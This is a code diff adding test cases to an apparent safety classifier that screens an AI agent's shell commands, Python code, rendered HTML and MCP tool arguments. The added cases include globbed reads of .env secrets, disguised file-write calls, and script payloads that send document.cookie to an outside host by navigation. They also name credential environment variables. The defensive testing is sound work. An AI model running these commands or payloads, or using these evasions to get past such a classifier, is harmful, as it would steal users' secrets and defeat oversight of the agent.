@@ -222,6 +222,8 @@ def _clear_pending():
         ("cat proj/.netr?", True),  # glob resolves to .netrc anywhere
         ("cat repo/.aws/cred*", True),  # glob resolves to credentials anywhere
         ("cat backup/id_rs?", True),  # glob resolves to id_rsa anywhere
+        ("cat .e?v", True),  # glob resolves to a project .env secret
+        ("cat proj/.en?", True),  # .env anywhere via a glob
         ("cat notes/dra?t.txt", False),  # benign globbed basename stays safe
         ("cat data/token_counts.tx?", False),  # 'token' prefix basename stays safe
         ("ls /home/*/projects", False),  # benign glob not into a cred dir
@@ -387,6 +389,16 @@ def test_terminal_classifier(command, unsafe):
             "import os\nos.environ.get('PATH')",
             False,
         ),  # os.environ.get is not a dynamic namespace
+        (
+            "box.f = open\nbox.f('out.txt', 'w').write('x')",
+            True,
+        ),  # open bound onto an attribute then called
+        ("box.f = len\nbox.f([])", False),  # a benign attribute-bound callable stays safe
+        (
+            "open.__call__('out.txt', 'w').write('x')",
+            True,
+        ),  # open invoked via .__call__ still writes
+        ("print.__call__('x')", False),  # a benign .__call__ stays safe
         ("import builtins\nf = builtins.open\nf('out', 'w')", True),  # attribute alias write
         ("open('out', **{'mode': 'w'}).write('x')", True),  # kwargs splat mode
         ("name = 'passwd'\nopen(f'/etc/{name}').read()", True),  # dynamic /etc segment
@@ -877,6 +889,14 @@ def test_render_html_gated_only_when_networked():
     assert rh("<img srcset='https://evil/x.png 1x'>") is True
     assert rh("<img src='/api/leak?d=1'>") is True  # root-relative resolves to origin
     assert rh("<link rel=stylesheet href='//cdn/x.css'>") is True  # protocol-relative
+    # Self-navigation sinks exfiltrate by navigating the frame away.
+    assert rh("<script>location.href='https://x/?d='+document.cookie</script>") is True
+    assert rh("<script>location.assign('https://x')</script>") is True
+    assert rh("<script>location.replace('https://x')</script>") is True
+    assert rh("<script>window.open('https://x')</script>") is True
+    assert rh("<script>window.location='https://x'</script>") is True
+    assert rh("<script>location.reload()</script>") is False  # reload is not navigation
+    assert rh("<script>history.back()</script>") is False
 
 
 def test_unknown_tools_fail_closed():
@@ -951,8 +971,13 @@ def test_mcp_classifier(tool, unsafe):
         ({"path": "/etc/passwd"}, True),  # read-named tool at a credential path
         ({"path": "../../.ssh/id_rsa"}, True),
         ({"nested": {"file": "~/.aws/credentials"}}, True),
+        ({"name": "OPENAI_API_KEY"}, True),  # explicit credential env-var read
+        ({"name": "AWS_SECRET_ACCESS_KEY"}, True),
+        ({"key": "DATABASE_PASSWORD"}, True),
         ({"path": "notes.txt"}, False),  # ordinary path stays safe
         ({"path": "data/report.csv"}, False),
+        ({"name": "PATH"}, False),  # a non-secret env var stays safe
+        ({"name": "HOME"}, False),
     ],
 )
 def test_mcp_sensitive_arguments(args, unsafe):
@@ -1069,6 +1094,11 @@ def test_mcp_sensitive_arguments(args, unsafe):
         ({"query": "GRANT SELECT ON t TO u"}, True),  # privilege grant (multi-word)
         ({"query": "REVOKE ALL ON t FROM u"}, True),  # privilege revoke (multi-word)
         ({"query": "SELECT * FROM grants"}, False),  # 'grants' table stays safe
+        ({"url": "http://x", "method": "DELETE"}, True),  # mutating HTTP verb arg
+        ({"method": "POST"}, True),
+        ({"verb": "PUT"}, True),  # alternate method-key name
+        ({"method": "GET"}, False),  # read HTTP verb stays safe
+        ({"method": "HEAD"}, False),
     ],
 )
 def test_mcp_mutating_arguments(args, unsafe):
